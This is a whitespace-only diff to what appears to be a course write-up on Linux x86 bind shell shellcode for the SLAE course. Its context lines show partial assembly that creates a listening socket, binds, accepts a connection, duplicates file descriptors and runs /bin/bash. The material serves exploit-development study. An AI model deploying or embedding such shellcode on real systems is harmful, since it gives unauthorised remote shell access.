@@ -243,7 +243,6 @@ The assembly code that was written for this exercise is as follows:
 ; Website:  http://github.com/14deep
 ; Purpose:  Bind shell shellcode for Linux x86 for the SLAE course
 
-
 global _start			
 
 section .text
@@ -280,9 +279,6 @@ _start:
 	mov edx, eax ; Moving the File Descriptor return value to edx
 
 
-
-
-
 	;Bind - binding the created socket to a port
 	;Similar to socket, but with different parameters for the bind socketcall
 
@@ -311,9 +307,6 @@ _start:
 	int 0x80     ; Interupt to call the syscall
 
 
-
-
-
 	;Listen - listen for an incoming connection
 
 	mov al, 0x66 ; Socketcall syscall
@@ -327,9 +320,6 @@ _start:
 	mov ecx, esp ; Moving the pointer to the stack into ecx
 
 	int 0x80     ; Interupt to call the syscall
-
-
-
 
 
 	;Accept - accept an incoming connection
@@ -349,8 +339,6 @@ _start:
 	mov edx, eax ; As a new FD is returned, it is moved from eax to edx
 
 
-	
-
 	;dup2 - duplicate the file descriptor to redirect the incoming connection 
 	;Note - this could be looped if required
 
@@ -367,7 +355,6 @@ _start:
 	inc ecx       ; Increment ecx so it is now 2
     	int 0x80      ; Interupt to call the syscall
 	
-
 
 	;execve - execute '/bin/bash' to provide a shell
 
@@ -386,7 +373,6 @@ _start:
 
     	mov al, 0xb   ; Moving 11 to eax for execve syscall
     	int 0x80      ; Interupt to call the syscall
-
 ~~~
 
 
